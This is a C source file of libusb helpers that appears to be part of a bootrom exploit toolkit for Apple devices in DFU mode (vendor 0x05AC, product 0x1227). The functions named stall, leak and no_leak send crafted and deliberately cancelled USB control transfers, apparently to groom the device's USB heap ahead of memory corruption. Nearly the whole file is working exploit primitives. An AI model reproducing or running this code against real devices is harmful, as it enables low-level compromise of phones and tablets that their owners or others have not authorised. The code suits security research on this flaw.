#include "libusb_helpers.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void get_test_device(libusb_context *usb_ctx, struct libusb_device_bundle *bundle)
{
    libusb_device **usb_device_list = NULL;
    int usb_dev_count;

    usb_dev_count = libusb_get_device_list(usb_ctx, &usb_device_list);

    libusb_device *usb_device = NULL;
    libusb_device_handle *usb_handle = NULL;
    struct libusb_device_descriptor usb_desc = {0};

    for(unsigned int i = 0; i < usb_dev_count; i++)
    {
        usb_device = usb_device_list[i];
        libusb_get_device_descriptor(usb_device, &usb_desc);

        if(usb_desc.idVendor == 0x05AC && usb_desc.idProduct == 0x1227)
        {
            libusb_open(usb_device, &usb_handle);
            break;
        }
    }

    libusb_free_device_list(usb_device_list, usb_dev_count);
    bundle->handle = usb_handle;
    bundle->descriptor = usb_desc;
}

void libusb1_async_ctrl_transfer(libusb_device_handle *handle,
                                 unsigned char bmRequestType, unsigned char bRequest,
                                 unsigned short wValue, unsigned short wIndex,
                                 unsigned char *data, unsigned short data_len,
                                 unsigned int timeout)
{
    struct timeval start, end;
    unsigned char usb_transfer_buf[8 + data_len];
    int ret;

    gettimeofday(&start, NULL);

    struct libusb_transfer *usb_transfer = libusb_alloc_transfer(0);
    libusb_fill_control_setup(usb_transfer_buf, bmRequestType, bRequest, wValue, wIndex, 0xC0);
    memcpy(&usb_transfer_buf[8], data, data_len);
    libusb_fill_control_transfer(usb_transfer, handle, usb_transfer_buf, NULL, NULL, 1);

    ret = libusb_submit_transfer(usb_transfer);
    if(ret != 0)
    {
        printf("Failed to submit async USB transfer: %s\n", libusb_error_name(ret));
        libusb_free_transfer(usb_transfer);
        exit(ret);
    }

    while(1)
    {
        gettimeofday(&end, NULL);
        if(end.tv_usec - start.tv_usec > timeout)
        {
            ret = libusb_cancel_transfer(usb_transfer);
            if(ret != 0)
            {
                printf("Failed to cancel async USB transfer: %s\n", libusb_error_name(ret));
                exit(ret);
            }
            return;
        }
    }
}

void libusb1_no_error_ctrl_transfer(libusb_device_handle *handle,
                                    unsigned char bmRequestType, unsigned char bRequest,
                                    unsigned short wValue, unsigned short wIndex,
                                    unsigned char *data, unsigned short data_len,
                                    unsigned int timeout)
{
    int ret;
    unsigned char recipient = bmRequestType & 3u;
    unsigned char rqtype = bmRequestType & (3u << 5u);
    if(recipient == 1 && rqtype == (2u << 5u))
    {
        unsigned short interface = wIndex & 0xFFu;
        ret = libusb_claim_interface(handle, interface);
        if(ret > 0)
        {
            printf("%s\n", libusb_error_name(ret));
            exit(1);
        }
    }

    ret = libusb_control_transfer(handle, bmRequestType, bRequest, wValue, wIndex, data, data_len, timeout);
    if(ret > 0)
    {
        printf("%s\n", libusb_error_name(ret));
    }
}

void stall(libusb_device_handle *handle)
{
    printf("Stall\n");
    unsigned char *data = malloc(0xC0);
    memset(data, 0xA, 0xC0);
    libusb1_async_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A, data, 0xC0, 1);
    free(data);
}

void leak(libusb_device_handle *handle)
{
    printf("Leak\n");
    unsigned char *data = malloc(0xC0);
    memset(data, 0, 0xC0);
    libusb1_no_error_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A, data, 0xC0, 1000);
    free(data);
}

void no_leak(libusb_device_handle *handle)
{
    printf("No leak\n");
    unsigned char *data = malloc(0xC1);
    memset(data, 0, 0xC1);
    libusb1_no_error_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A, data, 0xC1, 1000);
    free(data);
}

void usb_req_stall(libusb_device_handle *handle)
{
    printf("Req stall\n");
    unsigned char data[0];
    libusb1_no_error_ctrl_transfer(handle, 0x2, 3, 0, 0x80, data, 0, 10000);
}

void usb_req_leak(libusb_device_handle *handle)
{
    printf("Req leak\n");
    unsigned char data[0x40];
    memset(data, 0, 0x40);
    libusb1_no_error_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A, data, 0x40, 1000);
}

void usb_req_no_leak(libusb_device_handle *handle)
{
    printf("Req no leak\n");
    unsigned char data[0x41];
    memset(data, 0, 0x41);
    libusb1_no_error_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A, data, 0x41, 1000);
}